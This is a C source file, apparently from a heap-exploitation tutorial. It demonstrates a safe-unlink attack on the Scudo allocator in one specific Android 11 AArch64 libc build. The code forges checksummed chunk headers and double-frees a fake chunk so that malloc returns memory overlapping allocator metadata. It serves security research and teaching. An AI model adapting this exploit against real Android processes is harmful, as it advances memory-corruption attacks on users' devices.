#define _GNU_SOURCE

#include "target.h"

#include <android/log.h>

#include <link.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * Safe-unlink demonstration for Android 11 AArch64 libc build ID
 * 2f454a66784581d5341aa0771c734666.
 *
 * Inspired by Section 5.2 of:
 * https://www.usenix.org/system/files/woot24-mao.pdf
 *
 * Starting primitives modeled here:
 *   - disclosure of the Scudo cookie, libc base, and current TSD address;
 *   - writable primary-backed memory for overlapping forged headers; and
 *   - controlled frees of those forged primary and secondary user pointers.
 *
 * Result demonstrated:
 *   - malloc(0x10) returns an address inside the current thread's PerClass
 *     metadata, overlapping allocator state.
 *
 * This only works because this exact Android 11 build stores full pointers in
 * PerClass::Chunks. Android 12+ AArch64 builds store scaled relative offsets.
 */

enum {
    kClassIdShift = 0,
    kStateShift = 8,
    kOriginShift = 10,
    kSizeOrUnusedBytesShift = 12,
    kOffsetShift = 32,
    kChecksumShift = 48,
    kBackingRequestSize = 0x80,
    kSecondaryGuardRequestSize = 0x20000,
    kForgedSecondaryBlockSize = 0x20000,
    kPerClassEntryCount = 28,
};

struct SecondaryHeader {
    struct SecondaryHeader *prev;
    struct SecondaryHeader *next;
    uintptr_t block_end;
    uintptr_t map_base;
    uintptr_t map_size;
    unsigned char platform_data;
    unsigned char padding[7];
};

struct PerClass {
    uint32_t count;
    uint32_t max_count;
    uintptr_t class_size;
    void *chunks[kPerClassEntryCount];
};

_Static_assert(sizeof(uintptr_t) == 8, "this PoC requires a 64-bit ABI");
_Static_assert(sizeof(struct SecondaryHeader) ==
                   HOW2SCUDO_TARGET_SECONDARY_HEADER_SIZE,
               "unexpected Android 11 secondary-header size");
_Static_assert(offsetof(struct SecondaryHeader, block_end) == 0x10,
               "unexpected BlockEnd offset");
_Static_assert(offsetof(struct SecondaryHeader, map_base) == 0x18,
               "unexpected MapBase offset");
_Static_assert(offsetof(struct SecondaryHeader, map_size) == 0x20,
               "unexpected MapSize offset");
_Static_assert(sizeof(struct PerClass) == HOW2SCUDO_TARGET_PER_CLASS_STRIDE,
               "unexpected Android 11 PerClass stride");
_Static_assert(offsetof(struct PerClass, chunks) ==
                   HOW2SCUDO_TARGET_PER_CLASS_CHUNKS_OFFSET,
               "unexpected PerClass Chunks offset");

static const char kLogTag[] = "HOW2SCUDO_UNLINK";
static uintptr_t g_libc_base;

__attribute__((format(printf, 3, 4))) static void
log_message(int priority, FILE *stream, const char *format, ...) {
    va_list arguments;
    va_start(arguments, format);

    va_list android_arguments;
    va_copy(android_arguments, arguments);
    __android_log_vprint(priority, kLogTag, format, android_arguments);
    va_end(android_arguments);

    fprintf(stream, "[%s] ", kLogTag);
    vfprintf(stream, format, arguments);
    fputc('\n', stream);
    fflush(stream);
    va_end(arguments);
}

#define LOGI(...) log_message(ANDROID_LOG_INFO, stdout, __VA_ARGS__)
#define LOGE(...) log_message(ANDROID_LOG_ERROR, stderr, __VA_ARGS__)

static uintptr_t untag(uintptr_t value) {
    return value & HOW2SCUDO_TARGET_ADDRESS_MASK;
}

static int find_libc(struct dl_phdr_info *info, size_t size, void *data) {
    (void)size;
    (void)data;

    if (info->dlpi_name != NULL &&
        strstr(info->dlpi_name, "/libc.so") != NULL) {
        g_libc_base = (uintptr_t)info->dlpi_addr;
        return 1;
    }
    return 0;
}

static bool locate_libc(void) {
    g_libc_base = 0;
    dl_iterate_phdr(find_libc, NULL);
    return g_libc_base != 0;
}

static uint32_t leak_scudo_cookie(void) {
    uintptr_t address = g_libc_base + HOW2SCUDO_TARGET_SCUDO_COOKIE_OFFSET;
    return *(volatile uint32_t *)address;
}

static uintptr_t read_tpidr_el0(void) {
    uintptr_t value;
    __asm__ volatile("mrs %0, tpidr_el0" : "=r"(value));
    return value;
}

static uintptr_t get_current_tsd(void) {
    uintptr_t tls = read_tpidr_el0();
    uintptr_t tsd =
        *(volatile uintptr_t *)(tls + HOW2SCUDO_TARGET_TLS_SLOT_OFFSET);
    return tsd & ~UINT64_C(1);
}

static uint32_t crc32_u64(uint32_t crc, uint64_t value) {
    crc ^= (uint32_t)value;
    for (int bit = 0; bit < 32; ++bit) {
        crc = (crc >> 1) ^ (0x82f63b78U & -(int32_t)(crc & UINT32_C(1)));
    }

    crc ^= (uint32_t)(value >> 32);
    for (int bit = 0; bit < 32; ++bit) {
        crc = (crc >> 1) ^ (0x82f63b78U & -(int32_t)(crc & UINT32_C(1)));
    }
    return crc;
}

static uint16_t scudo_header_checksum(uintptr_t user_pointer,
                                      uint64_t packed_header, uint32_t cookie) {
    uint32_t crc = crc32_u64(cookie, user_pointer);
    crc = crc32_u64(crc, packed_header & UINT64_C(0x0000ffffffffffff));
    return (uint16_t)(crc ^ (crc >> 16));
}

static uintptr_t header_pointer_for_checksum(const void *pointer) {
    return untag((uintptr_t)pointer) | HOW2SCUDO_TARGET_SCUDO_HEADER_TAG;
}

static uint64_t build_allocated_header(unsigned class_id, uint16_t checksum) {
    uint64_t header = 0;
    header |= (uint64_t)class_id << kClassIdShift;
    header |= UINT64_C(1) << kStateShift;
    header |= UINT64_C(0) << kOriginShift;
    header |= UINT64_C(0) << kSizeOrUnusedBytesShift;
    header |= UINT64_C(0) << kOffsetShift;
    header |= (uint64_t)checksum << kChecksumShift;
    return header;
}

static uint64_t forge_allocated_header(unsigned class_id,
                                       const void *user_pointer,
                                       uint32_t cookie) {
    uint64_t header_without_checksum =
        build_allocated_header(class_id, 0);
    uint16_t checksum = scudo_header_checksum(
        header_pointer_for_checksum(user_pointer), header_without_checksum,
        cookie);
    return build_allocated_header(class_id, checksum);
}

static uint64_t read_header_before(const void *user_pointer) {
    uint64_t header = 0;
    uintptr_t header_address =
        untag((uintptr_t)user_pointer) - HOW2SCUDO_TARGET_COMBINED_HEADER_SIZE;
    memcpy(&header, (const void *)header_address, sizeof(header));
    return header;
}

int how2scudo_run(void) {
    LOGI("=== Android 11 safe unlink tutorial ===");
    LOGI("Goal: use the secondary-list unlink writes to replace two raw "
         "PerClass entries with a pointer back into PerClass itself.");
    LOGI("Target: API %u, ABI %s, exact libc build ID %s.",
         HOW2SCUDO_TARGET_ANDROID_API, HOW2SCUDO_TARGET_ABI,
         HOW2SCUDO_TARGET_LIBC_BUILD_ID);
    LOGI("Success condition: malloc(0x10) returns an address inside the "
         "current TSD's class-1 PerClass object.");
    LOGI("Prerequisite: memory tagging must be disabled because the chosen "
         "fake block is allocator metadata, not taggable primary memory.");

    LOGI("[1/8] Locate libc and disclose the Scudo checksum cookie.");
    if (!locate_libc()) {
        LOGE("[1/8] Failed: could not locate libc.so.");
        return 1;
    }
    uint32_t cookie = leak_scudo_cookie();
    LOGI("[1/8] libc base: 0x%zx; cookie at +0x%zx: 0x%08x",
         (size_t)g_libc_base,
         (size_t)HOW2SCUDO_TARGET_SCUDO_COOKIE_OFFSET, cookie);

    LOGI("[2/8] Keep one genuine secondary allocation alive.");
    LOGI("The forged free removes an entry from Scudo's in-use secondary list; "
         "the guard prevents that list's size counter from underflowing.");
    void *secondary_guard = malloc(kSecondaryGuardRequestSize);
    if (secondary_guard == NULL) {
        LOGE("[2/8] Failed: secondary guard allocation returned null.");
        return 2;
    }
    LOGI("[2/8] live secondary guard: %p", secondary_guard);

    LOGI("[3/8] Initialize class 1 and locate its current-thread PerClass.");
    void *probe = malloc(HOW2SCUDO_TARGET_SMALLEST_PRIMARY_REQUEST_SIZE);
    if (probe == NULL) {
        LOGE("[3/8] Failed: class probe returned null.");
        return 3;
    }
    uint64_t probe_header = read_header_before(probe);
    unsigned probe_class =
        (unsigned)((probe_header >> kClassIdShift) & UINT64_C(0xff));
    if (probe_class != HOW2SCUDO_TARGET_SMALLEST_PRIMARY_CLASS_ID) {
        LOGE("[3/8] Failed: malloc(0x10) selected ClassId %u, not 1.",
             probe_class);
        return 3;
    }
    uintptr_t tsd = get_current_tsd();
    if (tsd == 0U) {
        LOGE("[3/8] Failed: the sanitizer TLS slot contains no TSD pointer.");
        return 3;
    }
    struct PerClass *per_class = (struct PerClass *)(
        tsd + HOW2SCUDO_TARGET_SMALLEST_PRIMARY_CLASS_ID *
                  HOW2SCUDO_TARGET_PER_CLASS_STRIDE);
    LOGI("[3/8] TSD=%p; class-1 PerClass=%p", (void *)tsd,
         (void *)per_class);
    LOGI("[3/8] Count=%u MaxCount=%u ClassSize=0x%zx",
         per_class->count, per_class->max_count,
         (size_t)per_class->class_size);
    if (per_class->max_count != kPerClassEntryCount ||
        per_class->class_size !=
            HOW2SCUDO_TARGET_SMALLEST_PRIMARY_BLOCK_SIZE) {
        LOGE("[3/8] Failed: runtime PerClass layout does not match this PoC.");
        return 3;
    }

    LOGI("[4/8] Allocate writable primary backing for overlapping headers.");
    unsigned char *backing = (unsigned char *)malloc(kBackingRequestSize);
    if (backing == NULL) {
        LOGE("[4/8] Failed: backing allocation returned null.");
        return 4;
    }
    memset(backing, 0, kBackingRequestSize);
    uintptr_t raw_backing = untag((uintptr_t)backing);
    struct SecondaryHeader *fake_secondary =
        (struct SecondaryHeader *)raw_backing;
    void *fake_primary_user =
        backing + HOW2SCUDO_TARGET_COMBINED_HEADER_SIZE;
    void *fake_secondary_user =
        backing + HOW2SCUDO_TARGET_SECONDARY_USER_DELTA;
    LOGI("[4/8] backing=%p; fake primary user=%p; fake secondary user=%p",
         (void *)backing, fake_primary_user, fake_secondary_user);

    LOGI("[5/8] Prepare valid class-1 and class-0 combined headers.");
    uint64_t forged_primary = forge_allocated_header(
        HOW2SCUDO_TARGET_SMALLEST_PRIMARY_CLASS_ID, fake_primary_user,
        cookie);
    uint64_t forged_secondary =
        forge_allocated_header(0U, fake_secondary_user, cookie);
    LOGI("[5/8] forged primary header:   0x%016llx",
         (unsigned long long)forged_primary);
    LOGI("[5/8] forged secondary header: 0x%016llx",
         (unsigned long long)forged_secondary);

    LOGI("[6/8] Insert the same fake block twice into raw-pointer PerClass.");
    LOGI("The two entries become the checked Prev->Next and Next->Prev links. "
         "The critical sequence now runs without logging allocations.");

    uint32_t count_before = per_class->count;
    if (count_before + 2U > per_class->max_count) {
        LOGE("[6/8] Failed: class-1 cache lacks two free entry slots.");
        return 5;
    }

    memcpy((void *)raw_backing, &forged_primary, sizeof(forged_primary));
    free(fake_primary_user);
    memcpy((void *)raw_backing, &forged_primary, sizeof(forged_primary));
    free(fake_primary_user);
    uint32_t count_after_double_free = per_class->count;

    /*
     * Interpret &chunks[count_before] as a SecondaryHeader. Its Prev and Next
     * fields overlap the two entries just populated with fake_secondary.
     * Setting the forged header's Prev and Next to this address satisfies both
     * safe-unlink checks and causes both entries to be replaced with link_node.
     */
    struct SecondaryHeader *link_node =
        (struct SecondaryHeader *)&per_class->chunks[count_before];
    fake_secondary->prev = link_node;
    fake_secondary->next = link_node;
    fake_secondary->block_end =
        raw_backing + kForgedSecondaryBlockSize;
    fake_secondary->map_base = raw_backing;
    fake_secondary->map_size = kForgedSecondaryBlockSize;
    fake_secondary->platform_data = 0;
    memset(fake_secondary->padding, 0, sizeof(fake_secondary->padding));
    memcpy((void *)(raw_backing + HOW2SCUDO_TARGET_SECONDARY_HEADER_SIZE),
           &forged_secondary, sizeof(forged_secondary));

    free(fake_secondary_user);
    uint32_t count_after_unlink = per_class->count;
    void *returned =
        malloc(HOW2SCUDO_TARGET_SMALLEST_PRIMARY_REQUEST_SIZE);
    uint32_t count_after_malloc = per_class->count;

    uintptr_t expected = (uintptr_t)link_node +
                         HOW2SCUDO_TARGET_COMBINED_HEADER_SIZE;
    bool matched =
        returned != NULL && untag((uintptr_t)returned) == expected;
    /*
     * malloc wrote its combined header over chunks[count_before]. Discard that
     * now-invalid residual entry before tutorial logging performs allocations.
     * The returned overlapping allocation remains live and is never freed.
     */
    per_class->count = count_before;

    LOGI("[6/8] Count transition: %u -> %u", count_before,
         count_after_double_free);
    LOGI("[7/8] Unlink completed; Count remained %u.", count_after_unlink);
    LOGI("[7/8] Both checked links now contain %p.", (void *)link_node);
    LOGI("[8/8] Count after malloc was %u; cache restored to %u for clean "
         "tutorial logging.", count_after_malloc, per_class->count);
    LOGI("[8/8] returned=%p; expected untagged address=%p", returned,
         (void *)expected);

    if (!matched) {
        LOGE("[8/8] Failed: malloc did not return the PerClass overlap.");
        return 6;
    }
    LOGI("[8/8] SUCCESS: malloc returned the desired PerClass overlap.");
    LOGI("Demonstrated primitive: a small allocation overlaps PerClass cache "
         "metadata, enabling control of subsequent cached allocation entries. "
         "This is not code execution.");
    return 0;
}

#ifdef HOW2SCUDO_STANDALONE
int main(void) { return how2scudo_run(); }
#endif
